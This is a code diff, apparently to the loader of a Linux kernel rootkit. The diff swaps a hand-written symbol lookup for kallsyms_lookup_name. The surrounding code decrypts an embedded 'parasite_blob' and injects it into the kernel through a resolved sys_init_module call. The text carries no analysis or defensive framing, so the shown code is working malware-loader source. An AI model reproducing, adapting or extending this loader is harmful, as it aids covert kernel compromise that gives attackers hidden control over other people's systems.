@@ -2,6 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/uaccess.h>
+#include "lookup.h"
 
 #ifndef user_addr_max
 #define user_addr_max() (current_thread_info()->addr_limit.seg)
@@ -46,13 +47,6 @@ static int ksym_lookup_cb(unsigned long data[], const char *name, void *module,
 	return 0;
 }
 
-static inline unsigned long ksym_lookup_name(const char *name)
-{
-	unsigned long data[2] = {(unsigned long)name, 0};
-	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
-	return data[1];
-}
-
 int init_module(void)
 {
 	int ret = -EINVAL;
@@ -60,10 +54,10 @@ int init_module(void)
 
 	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);
 
-	sys_init_module = (void *)ksym_lookup_name(SYS_INIT_MODULE);
+	sys_init_module = (void *)kallsyms_lookup_name(SYS_INIT_MODULE);
 
 	if (!sys_init_module)
-		sys_init_module = (void *)ksym_lookup_name(__DO_SYS_INIT_MODULE);
+		sys_init_module = (void *)kallsyms_lookup_name(__DO_SYS_INIT_MODULE);
 
 	if (sys_init_module) {
 		const char *nullarg = parasite_blob;
